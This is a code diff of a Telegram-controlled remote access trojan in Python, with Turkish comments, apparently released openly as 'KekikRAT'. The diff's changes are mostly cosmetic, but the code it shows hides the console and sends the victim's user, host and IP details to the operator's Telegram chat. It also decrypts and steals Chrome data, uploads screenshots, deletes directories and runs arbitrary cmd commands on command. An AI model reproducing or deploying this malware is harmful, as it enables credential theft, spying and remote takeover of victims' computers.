@@ -3,26 +3,26 @@
 # Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.
 # @raifpy > Ömer Rai'ye Sonsuz Teşekkürler..
 
-####################################################################################
-import os                   # Dizinler ve dosyalarla çalışmak için
-import platform             # PC bilgileri için
-import webbrowser           # Tarayıcıda bağlantı açtırmak için
-import subprocess           # Kill Process(İşlem Sonlandırma) Kullanmak için
-import shutil               # Tarayıcı verilerini kopyalamak için
-import sqlite3              # Tarayıcıdan çekilen veritabanlarıyla çalışmak için
-import win32crypt           # Tarayıcıdan çekilen şifrelenmiş verileri çözmek için
-from PIL import ImageGrab   # Ekran görüntüsü almak için
-import subprocess           # WiFi işlemini Yakalamak için
-from lxml import etree      # FileZilla Dosyasını Okumak için
-import base64               # FileZilla'nın Şifrelenmiş verisini çözmek için.
-import re                   # Spesifik dosya seçebilmek için
-import zipfile              # Topladığımız verileri Zip'lemek için
-import requests             # Verileri Telegram apisi ile almak için
-import telebot              # Esas oğlanımız TeleBot
-####################################################################################
+#-----------------------------------------------------------------------------------#
+import os                   # Dizinler ve dosyalarla çalışmak için                  #
+import platform             # PC bilgileri için                                     #
+import webbrowser           # Tarayıcıda bağlantı açtırmak için                     #
+import subprocess           # Kill Process(İşlem Sonlandırma) Kullanmak için        #
+import shutil               # Tarayıcı verilerini kopyalamak için                   #
+import sqlite3              # Tarayıcıdan çekilen veritabanlarıyla çalışmak için    #
+import win32crypt           # Tarayıcıdan çekilen şifrelenmiş verileri çözmek için  #
+from PIL import ImageGrab   # Ekran görüntüsü almak için                            #
+import subprocess           # WiFi işlemini Yakalamak için                          #
+from lxml import etree      # FileZilla Dosyasını Okumak için                       #
+import base64               # FileZilla'nın Şifrelenmiş verisini çözmek için        #
+import re                   # Spesifik dosya seçebilmek için                        #
+import zipfile              # Topladığımız verileri Zip'lemek için                  #
+import requests             # Verileri Telegram apisi ile almak için                #
+import telebot              # Esas oğlanımız TeleBot                                #
+#-----------------------------------------------------------------------------------#
 
 #Hadi Başlayalım..
-########################################################################################################################
+#----------------------------------------------------------------------------------------------------------------------#
 def WindowsTerminaliGizle():                        # WindowsTerminaliGizle adında bir fonksiyon oluşturduk
     if isletim_sistemi == "Windows":                # Eğer İşletim Sistemi "Windows" ise
         import win32console, win32gui               # Gerekli Modüller
@@ -32,16 +32,16 @@ def WindowsTerminaliGizle():                        # WindowsTerminaliGizle adı
         pass                                        # Boşver :)
 #WindowsTerminaliGizle() # Eğer Windows'da Terminalin gizlenmesini istiyosanız aktifleştirin
                          # -- pyinstaller --onefile KekikRAT_v1.py --
-########################################################################################################################
+#----------------------------------------------------------------------------------------------------------------------#
 
-# / Telegram Bağlantısı ################################################
+# / Telegram Bağlantısı -----------------------------------------------#
 bot_token = "XXXX:XXXX"                                # Bot Token
 chat_id = "XXXX"                                       # Chat ID
 
 KekikRAT = telebot.TeleBot(bot_token)  # telebot'a Tokenimizi bağladık
-# / Telegram Bağlantısı ################################################
+# / Telegram Bağlantısı -----------------------------------------------#
 
-# / Bağlantı Geldi #################################################
+# / Bağlantı Geldi -------------------------------------------------------------------------#
 r = requests.get('http://ip.42.pl/raw') # Harici IP'yi bulmak için bir GET isteği yolluyoruz
 
 kullanici_adi = os.getlogin()           # Kullanıcı Adı Değişkeni tanımlıyoruz
@@ -57,21 +57,21 @@ KekikRAT.send_message(chat_id,
                    kullanici_adi + '@' + bilgisayar_adi +
                    "\n\t" + ip +
                    "\n\nOS : " + isletim_sistemi + ' | ' + bellenim_surumu) # Mesaj gönder
-# / Bağlantı Geldi #################################################
+# / Bağlantı Geldi -------------------------------------------------------------------------#
 
-# / Basla Komutu ########################################################################
+# / Basla Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=['basla', 'Basla'])  # Basla Komutunu bekliyorum
-def baslangic(command):                                 # Komut yürütülürse
+def Basla(command):                                     # Komut yürütülürse
     KekikRAT.send_chat_action(chat_id, 'typing')        # Yazıyor Aksiyonu
     KekikRAT.send_message(chat_id,
                           "☣ KekikRAT Çalışıyor ☣" +
                           "\n\nKomutları Öğrenmek için: /komutlar yazabilirsin.." +
                           "\n\nCoded by @keyiflerolsun \nSpecial for @KekikAkademi ♥") # Mesaj gönder
-# / Basla Komutu ########################################################################
+# / Basla Komutu -------------------------------------------------------------------------#
 
-# / Komutlar Komutu #######################################################################
+# / Komutlar Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=['komutlar', 'Komutlar'])    # Komutlar Komutunu bekliyorum
-def komutlar(command):
+def Komutlar(command):
     KekikRAT.send_chat_action(chat_id, 'typing')                # Yazıyor Aksiyonu
     KekikRAT.send_message(chat_id,
                        "KekikRAT içinde Kullanabileceğiniz Komutlar\n\n"+
@@ -89,11 +89,11 @@ def komutlar(command):
                        "/indir - Dosya İndirir\n"+
                        "/cmd - CMD'den Komut Çalıştır\n"+
                        "\n\t/hakkinda - Bot Hakkında Bilgi") # Mesaj gönder
-# / Komutlar Komutu #######################################################################
+# / Komutlar Komutu -------------------------------------------------------------------------#
 
-# / Sistem Komutu ################################################################################
+# / Sistem Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=['sistem', 'Sistem']) # sistem Komutunu bekliyorum
-def sistem(command):
+def Sistem(command):
     r = requests.get('http://ip.42.pl/raw') # Harici IP'yi bulmak için bir GET isteği yolluyoruz
 
     kullanici_adi = os.getlogin()       # Kullanıcı Adı Değişkeni tanımlıyoruz
@@ -109,11 +109,11 @@ def sistem(command):
                        "\n\nIP : " + ip +
                        "\n\nOS : " + isletim_sistemi + ' | ' + bellenim_surumu +
                        "\n\nİşlemci : " + islemci) # Mesaj gönder
-# / Sistem Komutu ################################################################################
+# / Sistem Komutu -------------------------------------------------------------------------#
 
-# / Url_Ac Komutu ################################################################################
+# / Url_Ac Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=["url_ac", "Url_Ac"])  # url_ac Komutunu bekliyorum
-def url_ac(message):
+def Url_Ac(message):
     gelen_mesaj = "{0}".format(message.text) # İletiyi içeren değişken
     url = gelen_mesaj.split(" ")[1]          # URL içeren bir değişken tanımladık
 
@@ -123,11 +123,11 @@ def url_ac(message):
     webbrowser.get(chrome_dizini).open(url)         # Bağlantıyı aç / veya / open_new_tab(url)
     KekikRAT.send_chat_action(chat_id, 'typing')    # Yazıyor Aksiyonu
     KekikRAT.send_message(chat_id, "Hallettim!")    # Mesaj gönder
-# / Url_Ac Komutu ################################################################################
+# / Url_Ac Komutu -------------------------------------------------------------------------#
 
-# / Islem_Sonlandir Komutu ######################################################################################
+# / Islem_Sonlandir Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=["islem_sonlandir", "Islem_Sonlandir"]) # islem_sonlandir Komutunu bekliyorum
-def islem_sonlandir(message):
+def Islem_Sonlandir(message):
     try:                            # Çalıştırmayı Dene (Hata ile karşılaşıldığında betik kapanmasın diye..)
         gelen_mesaj = "{0}".format(message.text)                        # Gelen Mesajı içeren değişken
         subprocess.call("taskkill /IM " + gelen_mesaj.split(" ")[1])    # Süreci adıyla öldür
@@ -136,11 +136,11 @@ def islem_sonlandir(message):
     except:                                                             # Hata varsa
         KekikRAT.send_chat_action(chat_id, 'typing')                    # Yazıyor Aksiyonu
         KekikRAT.send_message(chat_id, "Kapatılamadı!")
-# / Islem_Sonlandir Komutu ######################################################################################
+# / Islem_Sonlandir Komutu -------------------------------------------------------------------------#
 
-# / Chrome_Verileri Komutu ######################################################################################
+# / Chrome_Verileri Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=["chrome_verileri", "Chrome_Verileri"]) # chrome_verileri Komutunu bekliyorum
-def chrome_verileri(message):
+def Chrome_Verileri(message):
     KekikRAT.send_chat_action(chat_id, 'typing')    # Yazıyor Aksiyonu
     KekikRAT.send_message(chat_id, "Bekleyin...")   # "Bekleyin..." mesajını gönderiyoruz
     KekikRAT.send_chat_action(chat_id, 'typing')    # Yazıyor Aksiyonu
@@ -576,11 +576,11 @@ def chrome_verileri(message):
     ###
     KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(chat_id, "Hallettim!")
-# / Chrome_Verileri Komutu ######################################################################################
+# / Chrome_Verileri Komutu -------------------------------------------------------------------------#
 
-# / Ekran_Goruntusu Komutu ##################################################################################################################
+# / Ekran_Goruntusu Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=['ekran_goruntusu', 'Ekran_Goruntusu']) # ekran_goruntusu Komutunu bekliyorum
-def ekran_goruntusu(command) :
+def Ekran_Goruntusu(command) :
     KekikRAT.send_chat_action(chat_id, 'typing')                    # Yazıyor Aksiyonu
     KekikRAT.send_message(chat_id, "Bekleyin...")                   # "Bekleyin..." mesajını gönderiyoruz
     ekran = ImageGrab.grab()                                        # ekran görüntüsü almaya eşit bir değişken oluşturduk
@@ -589,27 +589,27 @@ def ekran_goruntusu(command) :
     ekran_resmi = {'photo': ekran}                                  # POST isteği göndermek için değişken oluşturduk
     KekikRAT.send_chat_action(chat_id, 'upload_photo')              # Fotoğraf Gönderiyor Aksiyonu
     requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=ekran_resmi) # Bir istekte bulunuyoruz
-# / Ekran_Goruntusu Komutu ##################################################################################################################
+# / Ekran_Goruntusu Komutu -------------------------------------------------------------------------#
 
-# / PWD Komutu ##################################################################################
+# / PWD Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=['pwd' , 'PWD']) # pwd Komutunu Bekliyorum
-def pwd(command) :
+def PWD(command) :
     bulunulan_dizin = os.path.abspath(os.getcwd())  # Geçerli Dizini tanımladık
     KekikRAT.send_chat_action(chat_id, 'typing')    # Yazıyor Aksiyonu
     KekikRAT.send_message(chat_id, "Geçerli dizin: \n" + (str(bulunulan_dizin)))  # Mesaj gönder
-# / PWD Komutu ##################################################################################
+# / PWD Komutu -------------------------------------------------------------------------#
 
-# / LS Komutu ###################################################################################################
+# / LS Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=["ls", "LS"])    # ls Komutunu bekliyorum
-def ls_dir(commands):
+def LS_dir(commands):
      listele = '\n'.join(os.listdir(path="."))      # Tüm klasörleri ve dosyaları içeren listele değişkeni tanımladık
      KekikRAT.send_chat_action(chat_id, 'typing')   # Yazıyor Aksiyonu
      KekikRAT.send_message(chat_id, "{} :".format(os.getcwd()) + "\n\n" + listele)
-# / LS Komutu ###################################################################################################
+# / LS Komutu -------------------------------------------------------------------------#
 
-# / CD Komutu #############################################################################
+# / CD Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=["cd", "CD"])        # cd Komutunu bekliyorum
-def cd_dir(message):
+def CD_dir(message):
     try:                                                # Çalıştırmayı Dene
         gelen_mesaj = "{0}".format(message.text)
         gidilecek_dizin = gelen_mesaj.split(" ")[1]     # Değişken - dizin
@@ -619,11 +619,11 @@ def cd_dir(message):
     except:                                             # Hata varsa
         KekikRAT.send_chat_action(chat_id, 'typing')    # Yazıyor Aksiyonu
         KekikRAT.send_message(chat_id, "Dizine Gidilemedi!")
-# / CD Komutu #############################################################################
+# / CD Komutu -------------------------------------------------------------------------#
 
-# / RM_Dir Komutu ######################################################################
+# / RM_dir Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands = ["rm_dir", "RM_Dir"])  # rm_dir Komutunu bekliyorum
-def delete_dir(message) :
+def RM_dir(message) :
     try:                                                    # Çalıştırmayı Dene
         gelen_mesaj = "{0}".format(message.text)
         silinecek_dizin = gelen_mesaj.split(" ")[1]         # Değişken - Klasör adı
@@ -633,11 +633,11 @@ def delete_dir(message) :
     except:                                                 # Hata varsa
         KekikRAT.send_chat_action(chat_id, 'typing')        # Yazıyor Aksiyonu
         KekikRAT.send_message(chat_id, "dizin Silinemedi!")
-# / RM_Dir Komutu ######################################################################
+# / RM_Dir Komutu -------------------------------------------------------------------------#
 
-# / Indir Komutu ########################################################################
+# / Dosya_indir Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=["indir", "Indir"])      # indir Komutunu bekliyorum
-def dosya_indir(message):
+def Dosya_indir(message):
     try:                                                    # Çalıştırmayı Dene
         KekikRAT.send_chat_action(chat_id, 'typing')        # Yazıyor Aksiyonu
         KekikRAT.send_message(chat_id, "Bekleyin...")  
@@ -653,11 +653,11 @@ def dosya_indir(message):
     except:                                                 # Hata varsa
         KekikRAT.send_chat_action(chat_id, 'typing')        # Yazıyor Aksiyonu
         KekikRAT.send_message(chat_id, "Dosya İndirilemedi! (dizin İndirilmez!)")
-# / Indir Komutu ########################################################################
+# / Indir Komutu -------------------------------------------------------------------------#
 
-# / CMD Komutu ###########################################################################################
+# / CMD Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands=["cmd", "CMD"])      # cmd Komutunu bekliyorum
-def cmd_komutu(message) :
+def CMD_Komutu(message) :
     try:                                                # Çalıştırmayı Dene
         gelen_mesaj = "{0}".format(message.text)
         subprocess.Popen([r'C:\\Windows\\system32\\cmd.exe', gelen_mesaj.split(" ")[1]])  # Cmd'de çalıştır
@@ -666,13 +666,13 @@ def cmd_komutu(message) :
     except:                                             # Hata varsa
         KekikRAT.send_chat_action(chat_id, 'typing')    # Yazıyor Aksiyonu
         KekikRAT.send_message(chat_id, "CMD Komutu Çalıştırılamadı!")
-# / CMD Komutu ###########################################################################################
+# / CMD Komutu -------------------------------------------------------------------------#
 
-# / HAKKINDA Komutu ################################################################################################
+# / HAKKINDA Komutu -------------------------------------------------------------------------#
 @KekikRAT.message_handler(commands = ["hakkinda", "HAKKINDA"])  # hakkinda Komutunu bekliyorum
-def hakkinda(commands):
+def HAKKINDA(commands):
     KekikRAT.send_chat_action(chat_id, 'typing')                # Yazıyor Aksiyonu
     KekikRAT.send_message(chat_id, "☣ KekikRAT v 1.0 ☣ \n\nCoded by @keyiflerolsun \nSpecial for @KekikAkademi ♥")
-# / HAKKINDA Komutu ################################################################################################
+# / HAKKINDA Komutu -------------------------------------------------------------------------#
 
 KekikRAT.polling()                                              # Çalış Aslan Parçası :)
